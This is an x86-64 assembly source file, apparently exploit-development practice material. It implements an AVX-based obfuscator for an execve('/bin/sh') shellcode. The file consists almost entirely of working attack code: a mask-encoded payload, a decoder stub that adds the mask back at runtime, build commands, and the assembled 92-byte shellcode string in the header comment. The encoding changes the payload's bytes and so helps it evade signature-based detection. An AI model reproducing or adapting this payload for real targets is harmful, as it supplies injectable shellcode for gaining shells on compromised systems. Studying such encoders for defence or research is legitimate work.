; 
; Shellcode Obfuscator with AVX only instructions (no AVX2)
;
; The obfuscation is done with a MASK that will be added to the 
; "encoded_shellcode". 
; I did in this way because I was trying to avoid specific bytes,
; but you can choose your own way here
;
; The shellcode is a "standard" execve("/bin/sh")
;
; To try this:   nasm -f elf64 avx_only.asm -o avx_only.o
;                ld --omagic -o shell avx_only.o
; 
; resulting shellcode (92 bytes)
;
; \xeb\x2a\x5e\x48\x8d\x7e\x16\xf3\x0f\x6f\x06\xf3\x0f\x6f\x4e\x10\xf3\x0f\x6f\x17\xf3\x0f\x6f\x5f\x10\xc5\xf9\xfc\xc2\xc5\xf1\xfc\xcb\xf3\x0f\x7f\x06\xf3\x0f\x7f\x4e\x10\xeb\x05\xe8\xd1\xff\xff\xff\x30\xf5\x36\x28\xba\x2e\x32\x39\x6d\x2e\x2e\x72\x67\x33\x34\x3f\xf6\xed\xaf\x3a\x0e\x04\x01\x01\x20\x20\x01\x01\x30\x30\x01\x01\x01\x01\x01\x20\x20\x20\x01\x01\x01\x01\x01\x01
; 

global _start

_start:
    jmp main

deobfuscator:
    pop rsi                    ; shellcode address in RSI
    lea rdi, [rsi+22]          ; mask address in rdi
 
    movdqu xmm0,[rsi]          ; shellcode in xmm0 and xmm1
    movdqu xmm1,[rsi + 16]     ; AVX only, so we split the move in two reg
    
    movdqu xmm2,[rdi]          ; mask in xmm2 and xmm3
    movdqu xmm3,[rdi + 16]
    
    vpaddb xmm0,xmm2           ; add operation to obtain the shellcode
    vpaddb xmm1,xmm3
    
    movdqu [rsi],xmm0          ; move back the decoded payload
    movdqu [rsi + 16],xmm1

    jmp encoded_shellcode

main:
    call deobfuscator

    encoded_shellcode: db 0x30,0xf5,0x36,0x28,0xba,0x2e,0x32,0x39,0x6d,0x2e,0x2e,0x72,0x67,0x33,0x34,0x3f,0xf6,0xed,0xaf,0x3a,0x0e,0x04
    mask: db 0x01,0x01,0x20,0x20,0x01,0x01,0x30,0x30,0x01,0x01,0x01,0x01,0x01,0x20,0x20,0x20,0x01,0x01,0x01,0x01,0x01,0x01 
